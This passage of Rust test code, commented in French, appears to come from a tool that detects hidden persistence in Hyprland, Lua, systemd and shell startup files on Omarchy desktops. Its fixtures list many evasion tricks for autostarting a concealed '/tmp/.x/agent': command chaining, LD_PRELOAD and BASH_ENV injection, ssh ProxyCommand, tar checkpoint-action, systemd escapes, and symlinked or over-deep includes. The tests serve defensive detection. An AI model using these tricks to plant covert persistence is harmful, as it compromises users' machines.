            "hl.exec_cmd(\"kitty \" .. os.getenv(\"ZZ\"))\n",
            "hl[\"exec\" .. \"_cmd\"](\"/tmp/.x/agent\")\n",
            "local k = \"exec_cmd\"\nhl[k](\"/tmp/.x/agent\")\n",
            "local h = hl\nh[\"exec\" .. \"_cmd\"](\"/tmp/.x/agent\")\n",
            "for k, f in pairs(os) do if k == \"execute\" then f(\"/tmp/.x/agent\") end end\n",
            "-- c\rhl.exec_cmd(\"/tmp/.x/agent\")\n",
            "o.shell_succeeds(\"/tmp/.x/agent\")\n",
            "o.bind(\"SUPER + X\", \"X\", { omarchy = \"x; /tmp/.x/agent\" })\n",
            "o.bind(\"SUPER + X\", \"X\", { menu = \"x; /tmp/.x/agent\" })\n",
            "o.bind(\"SUPER + X\", \"X\", o.launch_webapp(\"x; /tmp/.x/agent\"))\n",
            "hl.exec_cmd(o.launch_webapp(\"x; /tmp/.x/agent\"))\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("verif2-lua-{i}"));
            m.ecrire(".config/hypr/hyprland.lua", texte);
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(
                c.message.contains("~/.config/hypr/hyprland.lua"),
                "{texte:?} : {}",
                c.message
            );
        }
        // Ce que « require » et « dofile » chargent hors des dossiers lus (chemin de modules d'Omarchy : ~/.local/state,
        // ~/.config), introuvable, ou d'un chemin calculé : levé.
        for (i, (texte, module)) in [
            ("require(\"zz.agent\")\n", Some(".config/zz/agent.lua")),
            ("require(\"zz.agent\")\n", Some(".local/state/zz/agent.lua")),
            ("require(\"absent\")\n", None),
            (
                "dofile(os.getenv(\"HOME\") .. \"/.config/zz.lua\")\n",
                Some(".config/zz.lua"),
            ),
            (
                "dofile(\"/home/alice/.config/hypr/zz.txt\")\n",
                Some(".config/hypr/zz.txt"),
            ),
            ("dofile(nil or \"/usr/share/omarchy/x.lua\")\n", None),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("verif2-lua-charge-{i}"));
            m.ecrire(".config/hypr/hyprland.lua", texte);
            if let Some(f) = module {
                m.ecrire(f, "hl.exec_cmd(\"kitty\")\n");
            }
            let c = m.lancements();
            leve_non_declarable(&c, texte);
            assert!(
                c.message.contains("~/.config/hypr/hyprland.lua:1"),
                "{texte:?} : {}",
                c.message
            );
        }
        // Le modèle d'Omarchy (chemin par défaut de OMARCHY_PATH, modules de ~/.config/hypr) : rien.
        let m = Maison::nouvelle("verif2-lua-charge-sain");
        m.ecrire(
            ".config/hypr/hyprland.lua",
            "dofile((os.getenv(\"OMARCHY_PATH\") or \"/usr/share/omarchy\") .. \"/default/hypr/bootstrap.lua\")\n\
             require(\"hypr.monitors\")\nrequire(\"omarchy.current.theme.hyprland\")\n",
        );
        m.ecrire(
            ".config/hypr/monitors.lua",
            "hl.monitor({ output = \"\", mode = \"preferred\" })\n",
        );
        m.ecrire(
            ".config/omarchy/current/theme/hyprland.lua",
            "hl.config({ general = { gaps_in = 5 } })\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
        // Le retour chariot seul compte une ligne, comme pour Lua : l'appel est à la ligne 2.
        let m = Maison::nouvelle("verif2-lua-cr");
        m.ecrire(".config/hypr/hyprland.lua", "-- c\rhl.exec_cmd(\"/tmp/.x/agent\")\r\n");
        let c = m.lancements();
        assert!(c.message.contains("~/.config/hypr/hyprland.lua:2"), "{}", c.message);
    }

    /// B5, B6 : les dossiers d'unités que systemd lit en plus (user.attached, XDG_CONFIG_DIRS, XDG_DATA_DIRS que le
    /// compte peut changer, le dossier de session de systemd quand XDG_RUNTIME_DIR mène ailleurs) se lisent.
    #[test]
    fn dossiers_d_unites_de_systemd_lus() {
        const AGENT: &str = "[Service]\nExecStart=%h/.x/agent\n";
        for (i, (unite, variables)) in [
            (".config/systemd/user.attached/agent.service", vec![]),
            (
                ".xdgc/systemd/user/agent.service",
                vec![("XDG_CONFIG_DIRS", "/home/alice/.xdgc:/etc/xdg")],
            ),
            (
                ".local/share/flatpak/exports/share/systemd/user/agent.service",
                vec![(
                    "XDG_DATA_DIRS",
                    "/home/alice/.local/share/flatpak/exports/share:/usr/share",
                )],
            ),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-unites-{i}"));
            m.ecrire(unite, AGENT);
            let c = m.lancements_avec(&variables);
            let r = leve_non_declarable(&c, unite);
            assert!(c.message.contains(&format!("~/{unite}:2")), "{}", c.message);
            assert!(r.contains("lit en plus"), "{r}");
        }
        // B6 : XDG_RUNTIME_DIR ailleurs ; le dossier de session de systemd se lit quand même, et l'écart se dit.
        let m = Maison::nouvelle("relecture-unites-session");
        let f = m.racine.join("run/user/1000/systemd/user/agent.service");
        std::fs::create_dir_all(f.parent().unwrap()).unwrap();
        std::fs::write(&f, AGENT).unwrap();
        let c = m.lancements_avec(&[("XDG_RUNTIME_DIR", "/run/user/autre")]);
        leve_non_declarable(&c, "session");
        assert!(
            c.message.contains("/run/user/1000/systemd/user/agent.service:2"),
            "{}",
            c.message
        );
        assert!(
            c.message.contains("XDG_RUNTIME_DIR mène à /run/user/autre"),
            "{}",
            c.message
        );
        // Un dossier de XDG_DATA_DIRS à root seul (celui du système) n'est pas « en plus ».
        let m = Maison::nouvelle("relecture-unites-sain");
        let c = m.lancements_avec(&[("XDG_DATA_DIRS", "/usr/share"), ("XDG_CONFIG_DIRS", "/etc/xdg")]);
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// D-2 (relecture 0.94) : XDG_RUNTIME_DIR changé ne déplace pas le dossier de session de systemd
    /// (/run/user/<uid>) en fin de liste : l'ordre est celui de la vraie session, chaque dossier de la variable juste
    /// après celui de systemd ; /run/user/<uid>/systemd/user passe donc toujours avant /usr/lib/systemd/user.
    #[test]
    fn un_xdg_runtime_dir_change_garde_l_ordre_de_systemd() {
        let uid = uid_du_compte().expect("uid du compte");
        let vrai = format!("/run/user/{uid}");
        let maison = Path::new("/home/alice");
        let ordre = |runtime: &str| {
            let runtime = std::ffi::OsString::from(runtime);
            dossiers_d_unites_du_compte(maison, |v| (v == "XDG_RUNTIME_DIR").then(|| runtime.clone())).unwrap()
        };
        let attendu = ordre(&vrai);
        let faux = ordre("/tmp/faux");
        let sans_la_variable: Vec<_> = faux.iter().filter(|d| !d.starts_with("/tmp/faux")).cloned().collect();
        assert_eq!(sans_la_variable, attendu, "ordre de systemd perdu : {faux:#?}");
        for d in DOSSIERS_DE_LA_SESSION {
            let de_systemd = faux.iter().position(|p| *p == Path::new(&vrai).join(d));
            let de_la_variable = faux.iter().position(|p| *p == Path::new("/tmp/faux").join(d));
            assert!(
                de_systemd.zip(de_la_variable).is_some_and(|(a, b)| b == a + 1),
                "{d} : {faux:#?}"
            );
        }
        let place = |p: &str| faux.iter().position(|d| d == Path::new(p));
        assert!(
            place(&format!("{vrai}/systemd/user")) < place("/usr/lib/systemd/user"),
            "{faux:#?}"
        );
    }

    /// C1, C2, C3, C5 : une ligne d'unité se juge telle que systemd la lit (BOM en tête de ligne, chemin simplifié,
    /// « % » remplacés, échappements et guillemets décodés, chaque commande d'une ligne, tous les préfixes) ; les
    /// réglages qui changent ce qui se lance sans ligne Exec sont levés.
    #[test]
    fn unite_lue_comme_systemd() {
        for (i, service) in [
            "\u{feff}ExecStart=/tmp/.x/agent\n",
            "ExecStart=//tmp/.x/agent\n",
            "ExecStart=/var/../tmp/.x/agent\n",
            "ExecStart=%T/.x/agent\n",
            "ExecStart=%h//.x/agent\n",
            "ExecStart=\\x2ftmp/.x/agent\n",
            "ExecStartPre=/usr/bin/true ; /tmp/.x/agent\nExecStart=/usr/bin/true\n",
            "ExecStart=|/tmp/.x/agent\n",
            "Environment=LD_PRELOAD=/usr/lib/libz.so\nExecStart=/usr/bin/true\n",
            "ExecSearchPath=%h/.x\nExecStart=agent\n",
            "Environment=\"PATH=%h/.x:/usr/bin\"\nExecStart=agent\n",
            "EnvironmentFile=%h/.x/variables\nExecStart=/usr/bin/true\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-systemd-{i}"));
            m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{service}"));
            let c = m.lancements();
            leve_non_declarable(&c, service);
            assert!(
                c.message.contains("~/.config/systemd/user/a.service:"),
                "{service:?} : {}",
                c.message
            );
        }
        // Ramenées à leur forme finale, ces lignes se déclarent comme la même ligne écrite simplement.
        for (i, service) in ["ExecStart=/t\"mp/.x/\"agent\n", "ExecStart=-:/tmp/.x/agent\n"]
            .into_iter()
            .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture-systemd-simple-{i}"));
            m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{service}"));
            leve(&m.lancements(), service);
        }
        // Même trou côté .desktop et Hyprland : « //tmp ».
        let m = Maison::nouvelle("relecture-systemd-desktop");
        m.ecrire(
            ".config/autostart/a.desktop",
            "[Desktop Entry]\nType=Application\nExec=//tmp/.x/agent\n",
        );
        leve_non_declarable(&m.lancements(), "desktop");
        let m = Maison::nouvelle("relecture-systemd-hypr");
        m.ecrire(".config/hypr/hyprland.conf", "exec-once = //tmp/.x/agent\n");
        leve_non_declarable(&m.lancements(), "hypr");
        // Des réglages ordinaires ne lèvent rien.
        let m = Maison::nouvelle("relecture-systemd-sain");
        m.ecrire(
            ".config/systemd/user/a.service",
            "[Service]\nEnvironment=LANG=fr_CA.UTF-8 \"PATH=/usr/local/bin:/usr/bin\"\nEnvironmentFile=-%h/.config/a.env\n\
             ExecStartPre=-/usr/bin/true\nExecStart=/usr/bin/sleep 60\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// C4 : un dossier d'ajouts (« .d ») qui est un lien vers un autre dossier est suivi, comme systemd le suit.
    #[test]
    fn dossier_d_ajouts_en_lien_suivi() {
        let m = Maison::nouvelle("relecture-lien-d");
        m.ecrire(".config/systemd/user/a.service", "[Service]\nExecStart=/usr/bin/true\n");
        m.ecrire(".x/d/z.conf", "[Service]\nExecStart=\nExecStart=%h/.x/agent\n");
        std::os::unix::fs::symlink(m.chemin(".x/d"), m.chemin(".config/systemd/user/a.service.d")).unwrap();
        let c = m.lancements();
        leve_non_declarable(&c, "lien .d");
        assert!(c.message.contains("lien vers ~/.x/d"), "{}", c.message);
        assert!(
            c.message.contains("~/.config/systemd/user/a.service.d/z.conf:3"),
            "{}",
            c.message
        );
    }

    // ---- Relecture adverse 2 (N1 à N11) : chaque forme levée, jamais déclarable. Valeurs inventées. ----

    /// N1 : une ligne « exec » de Hyprland passe par « /bin/sh -c » : chaque commande simple se juge (après « && »,
    /// « ; », « | », « & », dans « ( ) », « { } », « $( ) », après un « cd », une affectation ou une redirection) ; ce
    /// qui ne se coupe pas sûrement est dit.
    #[test]
    fn ligne_de_shell_de_hyprland_coupee() {
        for (i, commande) in [
            "sleep 2 && /tmp/.x/agent",
            "sleep 1; /tmp/.x/agent",
            "cd /tmp/.x; ./agent",
            "cd ~/.x && ./agent",
            "false || /tmp/.x/agent",
            "true | /tmp/.x/agent",
            "kitty&/tmp/.x/agent",
            "( /tmp/.x/agent )",
            "{ /tmp/.x/agent; }",
            "if true; then /tmp/.x/agent; fi",
            "FOO=1 /tmp/.x/agent",
            "</dev/null /tmp/.x/agent",
            "/tm\"\"p/.x/agent",
            "/t?p/.x/agent",
            "~bob/.x/agent",
            "\"$HOME\"/.x/agent",
            "echo `/tmp/.x/agent`",
            "echo $(/tmp/.x/agent)",
            "notify-send x; /tmp/.x/agent",
            "sh </tmp/.x/s",
            "bash -lc '/tmp/.x/agent'",
            "sh -c/tmp/.x/agent",
            "hyprctl dispatch exec /tmp/.x/agent",
            "env LD_PRELOAD=/usr/lib/x.so kitty",
            "/lib64/ld-linux-x86-64.so.2 ~/.x/agent",
            "gamemoderun ~/.x/agent",
            "xdg-terminal-exec ~/.x/agent",
            "omarchy-launch-or-focus x ~/.x/agent",
            "find / -maxdepth 0 -exec ~/.x/agent ;",
            "make -f ~/.x/mk",
            "vim -S ~/.x/s.vim",
            "git -c core.pager=~/.x/agent log",
            "ssh -oProxyCommand=~/.x/agent h",
            "tar -cf /dev/null --checkpoint-action=exec=~/.x/agent /etc/hostname",
            "python3 -c 'import os; os.system(\"~/.x/agent\")'",
            "echo 'non fermé",
            "/proc/self/root/tmp/.x/agent",
            "/run/user/1000/agent",
        ]
        .into_iter()
        .enumerate()
        {
            // Ce qui ne se lit pas sûrement ne se déclare pas normal ; le reste se montre tel quel.
            let non_lu = ["/t?p/.x/agent", "~bob/.x/agent", "echo 'non fermé"].contains(&commande);
            let m = Maison::nouvelle(&format!("relecture2-shell-{i}"));
            let texte = format!("exec-once = {commande}\n");
            m.ecrire(".config/hypr/hyprland.conf", &texte);
            let c = m.lancements();
            leve(&c, &texte);
            if non_lu {
                leve_non_declarable(&c, &texte);
            }
            let m = Maison::nouvelle(&format!("relecture2-shell-lua-{i}"));
            let texte = format!("hl.exec_cmd([[{commande}]])\n");
            m.ecrire(".config/hypr/autostart.lua", &texte);
            leve(&m.lancements(), &texte);
        }
        // Un raccourci aussi, et sa commande après une autre.
        let m = Maison::nouvelle("relecture2-shell-bind");
        m.ecrire(
            ".config/hypr/hyprland.conf",
            "bind = SUPER, Q, exec, notify-send x; /tmp/.x/agent\n",
        );
        leve(&m.lancements(), "bind");
        // Les lignes du modèle d'Omarchy ne lèvent rien.
        let m = Maison::nouvelle("relecture2-shell-sain");
        m.ecrire(
            ".config/hypr/autostart.lua",
            "hl.exec_cmd(\"sleep 2 && omarchy-hook post-boot\")\n\
             hl.exec_cmd(\"xsetroot -cursor_name left_ptr >/dev/null 2>&1 || true\")\n\
             hl.exec_cmd(\"pkill hyprpicker || hyprpicker -a\")\n\
             o.bind(\"SUPER + K\", \"Omarchy's menu\", \"omarchy-menu\")\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    /// N4, N5 : les codes et les variables d'une unité remplacés comme systemd les remplace (« %u », « %t »,
    /// « $A », « ${A} », « $$ ») ; une variable inconnue dans l'argument d'un interpréteur est dite.
    #[test]
    fn unite_codes_et_variables_remplaces() {
        for (i, service) in [
            "ExecStart=/home/%u/.x/agent\n",
            "ExecStart=%t/.x/agent\n",
            "ExecStart=/run/user/1000/agent\n",
            "ExecStart=/proc/self/root/tmp/.x/agent\n",
            "Environment=A=/tmp/.x/a.sh\nExecStart=/bin/sh ${A}\n",
            "Environment=A=/tmp/.x/a.sh\nExecStart=/bin/sh $A\n",
            "Environment=A=/tmp/.x/a.sh\nExecStart=/bin/sh -c ${A}\n",
            "ExecStart=/bin/sh -c \"$$HOME/.x/agent\"\n",
            "ExecStart=/bin/sh -c \"sleep 1; /tmp/.x/agent\"\n",
            "ExecStart=/bin/sh $INCONNUE\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture2-unite-{i}"));
            let texte = format!("[Service]\n{service}");
            m.ecrire(".config/systemd/user/a.service", &texte);
            leve(&m.lancements(), &texte);
        }
    }

    /// N6, N7, N8 : un réglage ou une variable qui mène à un dossier temporaire ou caché se juge comme la commande
    /// (dossier courant, entrée, racine, montages, variables d'injection, fichier de variables, Hyprland,
    /// environment.d, user.conf de systemd).
    #[test]
    fn reglages_et_variables_vers_un_dossier_cache() {
        for (i, service) in [
            "WorkingDirectory=/tmp/.x\nExecStart=/bin/sh a.sh\n",
            "WorkingDirectory=/tmp/.x\nExecStart=/usr/bin/python3 -m a\n",
            "StandardInput=file:/tmp/.x/a.sh\nExecStart=/bin/sh\n",
            "RootDirectory=/tmp/.x\nExecStart=/usr/bin/true\n",
            "BindPaths=/tmp/.x/a:/usr/bin/true\nExecStart=/usr/bin/true\n",
            "Environment=BASH_ENV=/tmp/.x/e\nExecStart=/bin/bash -c true\n",
            "Environment=PYTHONPATH=%h/.x\nExecStart=/usr/bin/python3 -m a\n",
            "Environment=NODE_OPTIONS=--require=/tmp/.x/a.js\nExecStart=/usr/bin/node a\n",
            "EnvironmentFile=%h/v.env\nExecStart=/usr/bin/true\n",
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture2-reglage-{i}"));
            m.ecrire("v.env", "LD_PRELOAD=/usr/lib/x.so\n");
            let texte = format!("[Service]\n{service}");
            m.ecrire(".config/systemd/user/a.service", &texte);
            leve(&m.lancements(), &texte);
        }
        for (i, (fichier, texte)) in [
            (".config/hypr/hyprland.conf", "env = PATH,/tmp/.x:/usr/bin\n"),
            (".config/hypr/hyprland.conf", "env = BASH_ENV,~/.x/e\n"),
            (".config/environment.d/a.conf", "BASH_ENV=/tmp/.x/e\n"),
            (".config/environment.d/a.conf", "PATH=$HOME/.x:/usr/bin\n"),
            (
                ".config/systemd/user.conf",
                "[Manager]\nDefaultEnvironment=PATH=/tmp/.x:/usr/bin\n",
            ),
            (
                ".config/systemd/user.conf.d/a.conf",
                "[Manager]\nManagerEnvironment=\"BASH_ENV=/tmp/.x/e\"\n",
            ),
            (".profile", "export PYTHONSTARTUP=/tmp/.x/s.py\n"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture2-variable-{i}"));
            m.ecrire(fichier, texte);
            leve(&m.lancements(), texte);
        }
        // Des réglages ordinaires ne lèvent rien.
        let m = Maison::nouvelle("relecture2-reglage-sain");
        m.ecrire(
            ".config/systemd/user/a.service",
            "[Service]\nWorkingDirectory=%h\nEnvironment=PATH=%h/.local/bin:/usr/bin\nExecStart=/usr/bin/sleep 60\n",
        );
        m.ecrire(
            ".config/environment.d/a.conf",
            "PATH=$HOME/.local/bin:$PATH\nEDITOR=nvim\n",
        );
        let c = m.lancements();
        assert_eq!(c.probleme, None, "{}", c.message);
    }

    impl Maison {
        /// Tous les constats de la persistance (les lancements d'abord, puis les copies d'Omarchy, les services).
        fn constats(&self) -> Vec<Constat> {
            persistance_dans(
                &self.racine,
                &self.racine.join("home/alice"),
                |v| (v == "XDG_RUNTIME_DIR").then(|| "/run/user/1000".into()),
                None,
                None,
            )
        }

        /// Un fichier sous la racine (hors du dossier personnel), dossiers compris.
        fn ecrire_hors(&self, absolu: &str, texte: &str) {
            let p = self.racine.join(absolu.trim_start_matches('/'));
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(p, texte).unwrap();
        }
    }

    /// N2 : au-delà de SOURCES_MAX fichiers inclus par « source », ceux qui suivent ne sont pas lus : c'est dit avec
    /// leur nombre, jamais déclarable (des lignes, un joker de 80 fichiers, une chaîne de 70). En deçà, la ligne qui
    /// lance se montre.
    #[test]
    fn sources_au_dela_de_la_borne_dites() {
        use std::fmt::Write as _;
        let agent = "exec-once = /tmp/.x/agent\n";
        for (nom, inclusions) in [("lignes", 70), ("temoin", 40)] {
            let m = Maison::nouvelle(&format!("relecture2-borne-{nom}"));
            let mut texte = String::new();
            for i in 0..inclusions {
                m.ecrire(&format!(".dotfiles/h/{i:02}.conf"), &format!("$a{i} = 1\n"));
                let _ = writeln!(texte, "source = ~/.dotfiles/h/{i:02}.conf");
            }
            texte.push_str("source = ~/.dotfiles/z.conf\n");
            m.ecrire(".dotfiles/z.conf", agent);
            m.ecrire(".config/hypr/hyprland.conf", &texte);
            let c = m.lancements();
            if inclusions > SOURCES_MAX {
                leve_non_declarable(&c, nom);
                assert!(c.message.contains("ne sont pas lus"), "{}", c.message);
            } else {
                leve(&c, nom);
                assert!(c.message.contains("~/.dotfiles/z.conf:1"), "{}", c.message);
            }
        }
        // Un joker qui prend 80 fichiers, celui qui lance en dernier.
        let m = Maison::nouvelle("relecture2-borne-joker");
        for i in 0..80 {
            let texte = if i == 79 {
                agent.to_string()
            } else {
                format!("$a{i} = 1\n")
            };
            m.ecrire(&format!(".dotfiles/j/{i:02}.conf"), &texte);
        }
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.dotfiles/j/*.conf\n");
        let c = m.lancements();
        leve_non_declarable(&c, "joker");
        assert!(c.message.contains("ne sont pas lus"), "{}", c.message);
        // Une chaîne de 70 fichiers, chacun inclut le suivant.
        let m = Maison::nouvelle("relecture2-borne-chaine");
        for i in 0..70_u32 {
            m.ecrire(
                &format!(".dotfiles/c/{i}.conf"),
                &format!("source = ~/.dotfiles/c/{}.conf\n", i.saturating_add(1)),
            );
        }
        m.ecrire(".dotfiles/c/70.conf", agent);
        m.ecrire(".config/hypr/hyprland.conf", "source = ~/.dotfiles/c/0.conf\n");
        let c = m.lancements();
        leve_non_declarable(&c, "chaîne");
        assert!(c.message.contains("ne sont pas lus"), "{}", c.message);
    }

    /// N3 : un joker dans la partie dossier d'un « source » (Hyprland le développe, Vanguard non) est dit, comme une
    /// inclusion depuis un dossier temporaire, même au contenu anodin.
    #[test]
    fn source_joker_de_dossier_et_temporaire_dits() {
        for (i, (ligne, attendu)) in [
            ("source = ~/.config/*/y.conf\n", "par un joker dans le dossier"),
            ("source = ~/.dotfiles/?/y.conf\n", "par un joker dans le dossier"),
            ("source = /tmp/.x/y.conf\n", "rangé dans un dossier temporaire"),
            ("source = /dev/shm/y.conf\n", "rangé dans un dossier temporaire"),
        ]
        .into_iter()
        .enumerate()
        {
            let m = Maison::nouvelle(&format!("relecture2-source-{i}"));
            m.ecrire(".config/a/y.conf", "$a = 1\n");
            m.ecrire(".dotfiles/a/y.conf", "$a = 1\n");
            m.ecrire_hors("/tmp/.x/y.conf", "$a = 1\n");
            m.ecrire_hors("/dev/shm/y.conf", "$a = 1\n");
            m.ecrire(".config/hypr/hyprland.conf", ligne);
            let c = m.lancements();
            leve_non_declarable(&c, ligne);
            assert!(c.message.contains(attendu), "{ligne:?} : {}", c.message);
        }
    }

    /// N10 : un sous-dossier de ~/.config/hypr qui est un lien vers un dossier est suivi (ses modules jugés) et dit ;
    /// un module trop profond pour être lu est dit. Jamais déclarable.
    #[test]
    fn dossier_de_modules_en_lien_ou_trop_profond_dit() {
        let agent = "hl.exec_cmd(\"/tmp/.x/agent\")\n";
        for (i, dans_la_maison) in [true, false].into_iter().enumerate() {
            let m = Maison::nouvelle(&format!("relecture2-lien-{i}"));
            let cible = if dans_la_maison {
                m.chemin("z")
            } else {
                m.racine.join("tmp/.x/lib")
            };
            std::fs::create_dir_all(&cible).unwrap();
            std::fs::write(cible.join("m.lua"), agent).unwrap();
            m.ecrire(".config/hypr/hyprland.lua", "require(\"a.m\")\n");
            std::os::unix::fs::symlink(&cible, m.chemin(".config/hypr/a")).unwrap();
            let c = m.lancements();
            leve_non_declarable(&c, "lien");
            assert!(c.message.contains("est un lien vers"), "{}", c.message);
            assert!(c.message.contains("~/.config/hypr/a/m.lua:1"), "{}", c.message);
        }
        let m = Maison::nouvelle("relecture2-profond");
        m.ecrire(".config/hypr/a/b/c/d/e/f/g/h/i/j/k/m.lua", agent);
        let c = m.lancements();
        leve_non_declarable(&c, "profond");
        assert!(c.message.contains("dossiers de profondeur"), "{}", c.message);
        // Témoin : à trois dossiers, le module se lit et sa ligne se montre.
        let m = Maison::nouvelle("relecture2-profond-temoin");
        m.ecrire(".config/hypr/a/b/c/m.lua", agent);
        let c = m.lancements();
        leve(&c, "témoin");
        assert!(c.message.contains("~/.config/hypr/a/b/c/m.lua:1"), "{}", c.message);
    }

    /// N11 : un module Lua posé là où le chargeur d'Omarchy le prend hors de ~/.config/hypr (état, configuration,
    /// thème, bascules, dispositions) est lu et jugé, jamais déclarable ; sous un XDG_STATE_HOME déplacé aussi.
    #[test]
    fn modules_d_omarchy_hors_de_hypr_lus() {
        let agent = "hl.exec_cmd(\"/tmp/.x/agent\")\n";
        let modules = [
            ".local/state/default/hypr/omarchy.lua",
            ".local/state/hypr/monitors.lua",
            ".config/default/hypr/omarchy.lua",
            ".local/state/omarchy/current/theme/hyprland.lua",
            ".config/omarchy/current/theme/hyprland.lua",
            ".local/state/omarchy/toggles/hypr/x.lua",
            ".local/state/omarchy/workspace-layouts/x.lua",
        ];
        // Chaque dossier du chargeur a son essai.
        for (d, _) in MODULES_D_OMARCHY {
            assert!(modules.iter().any(|m| m.starts_with(d)), "{d} sans essai");
        }
        for (i, module) in modules.into_iter().enumerate() {
            let m = Maison::nouvelle(&format!("relecture2-omarchy-{i}"));
            m.ecrire(".config/hypr/hyprland.lua", "-- modèle\n");
            m.ecrire(module, agent);
            let c = m.lancements();
            leve_non_declarable(&c, module);
            assert!(c.message.contains(&format!("~/{module}:1")), "{module} : {}", c.message);
        }
        let m = Maison::nouvelle("relecture2-omarchy-etat");
        m.ecrire(".etat/omarchy/toggles/hypr/x.lua", agent);
        let c = m.lancements_avec(&[("XDG_STATE_HOME", "/home/alice/.etat")]);
        leve_non_declarable(&c, "XDG_STATE_HOME");
        assert!(
            c.message.contains("~/.etat/omarchy/toggles/hypr/x.lua:1"),
            "{}",
            c.message
        );
    }

    /// Point 8 de la deuxième vérification : une copie de la bibliothèque d'Omarchy ne se tait que si l'original est
    /// identique et à root seul. Ici l'original est au compte (essais sans root) : la copie reste jugée, rien ne se
    /// dit « copie conforme ».
    #[test]
    fn copie_d_omarchy_jugee_sans_original_de_root() {
        let texte = "hl.exec_cmd(\"/tmp/.x/agent\")\n";
        let m = Maison::nouvelle("relecture2-copie-compte");
        m.ecrire_hors("/usr/share/omarchy/default/hypr/x.lua", texte);
        m.ecrire(".config/hypr/x.lua", texte);
        m.ecrire(".config/hypr/default/hypr/x.lua", texte);
        let constats = m.constats();
        let c = constats.first().unwrap();
        leve(c, "copie");
        assert!(c.message.contains("~/.config/hypr/x.lua:1"), "{}", c.message);
        assert!(
            c.message.contains("~/.config/hypr/default/hypr/x.lua:1"),
            "{}",
            c.message
        );
        assert!(
            !constats.iter().any(|c| c.message.contains("copies conformes")),
            "un original au compte ne fait pas une copie conforme"
        );
    }

    /// Vérification 3, H5 : la logique de la copie conforme, le jugement « à root seul » remplacé, tourne aussi sous
    /// unshare (où rien n'est à root) : copie identique d'un original « à root », oui ; original au compte, contenu
    /// changé ou chemin relatif différent, non. Et la carte des identités : seule celle du système passe.
    #[test]
    fn copie_d_omarchy_selon_le_jugement_de_root() {
        let texte = "hl.exec_cmd(\"omarchy-lock-screen\")\n";
        let m = Maison::nouvelle("verif3-copie-selon");
        m.ecrire_hors("/usr/share/omarchy/default/hypr/x.lua", texte);
        m.ecrire(".config/hypr/default/hypr/x.lua", texte);
        m.ecrire(".config/hypr/default/hypr/y.lua", texte);
        m.ecrire(".config/hypr/x.lua", "-- changé\n");
        let r = Releveur {
            racine: m.racine.clone(),
            maison: m.chemin(""),
            ..Releveur::default()
        };
        let omarchy = m.racine.join("usr/share/omarchy");
        let a_root = |p: &Path| p.starts_with(&omarchy);
        let copie = m.chemin(".config/hypr/default/hypr/x.lua");
        assert_eq!(
            copie_d_omarchy_selon(&r, &copie, &a_root),
            Some(omarchy.join("default/hypr/x.lua"))
        );
        assert_eq!(
            copie_d_omarchy_selon(&r, &copie, &|_| false),
            None,
            "original au compte"
        );
        let sans_original = m.chemin(".config/hypr/default/hypr/y.lua");
        assert_eq!(copie_d_omarchy_selon(&r, &sans_original, &a_root), None);
        assert_eq!(
            copie_d_omarchy_selon(&r, &m.chemin(".config/hypr/x.lua"), &a_root),
            None,
            "contenu changé"
        );
        assert!(uid_sans_traduction("         0          0 4294967295\n"));
        assert!(!uid_sans_traduction("         0       1000          1\n"));
        assert!(!uid_sans_traduction("0 0 4294967295\n0 0 1\n"));
        assert!(!uid_sans_traduction(""));
    }

    /// Point 8 : la bibliothèque d'Omarchy du paquet (/usr/share/omarchy/default/hypr, à root) recopiée telle quelle
    /// dans ~/.config/hypr se dit en une ligne d'information, sans alerte ; un seul fichier changé se juge à
    /// nouveau. Demande la vraie bibliothèque, vue hors d'un espace de noms d'utilisateurs (le root qu'on y voit
    /// n'est pas celui du système).
    #[test]
    fn copie_conforme_de_la_bibliotheque_d_omarchy_dite() {
        let original = Path::new("/usr/share/omarchy/default/hypr");
        if !original.is_dir() {
            return crate::essais::saute("Omarchy absent : /usr/share/omarchy/default/hypr manque");
        }
        if !uid_sans_traduction(&std::fs::read_to_string("/proc/self/uid_map").unwrap_or_default()) {
            return crate::essais::saute(
                "dans un espace de noms d'utilisateurs (unshare -r), rien n'est « à root seul » : à lancer hors de lui",
            );
        }
        let m = Maison::nouvelle("relecture2-copie-root");
        std::fs::create_dir_all(m.racine.join("usr/share")).unwrap();
        std::os::unix::fs::symlink("/usr/share/omarchy", m.racine.join("usr/share/omarchy")).unwrap();
        let mut lus = Vec::new();
        parcourir(original, 4, &mut lus, &|f| a_l_extension(f, "lua"));
        assert!(lus.len() > 5, "{lus:?}");
        for f in &lus {
            let rel = f.strip_prefix(original).unwrap();
            let copie = m.chemin(".config/hypr/default/hypr").join(rel);
            std::fs::create_dir_all(copie.parent().unwrap()).unwrap();
            std::fs::copy(f, &copie).unwrap();
        }
        let constats = m.constats();
        let c = constats.first().unwrap();
        assert_eq!(c.probleme, None, "{}", c.message);
        assert!(
            constats
                .iter()
                .any(|c| c.probleme.is_none() && c.message.contains("copies conformes")),
            "{:?}",
            constats.iter().map(|c| &c.message).collect::<Vec<_>>()
        );
        // Une ligne de plus dans une copie : jugée comme avant.
        let autostart = m.chemin(".config/hypr/default/hypr/autostart.lua");
        let mut texte = std::fs::read_to_string(&autostart).unwrap();
        texte.push_str("hl.exec_cmd(\"/tmp/.x/agent\")\n");
        std::fs::write(&autostart, texte).unwrap();
        let c = m.lancements();
        leve(&c, "copie changée");
        assert!(
            c.message.contains("~/.config/hypr/default/hypr/autostart.lua:"),
            "{}",
            c.message
        );
    }

    /// Point 8 : au-delà des lignes montrées, l'alerte compte les autres par fichier : une ligne de plus, ou un
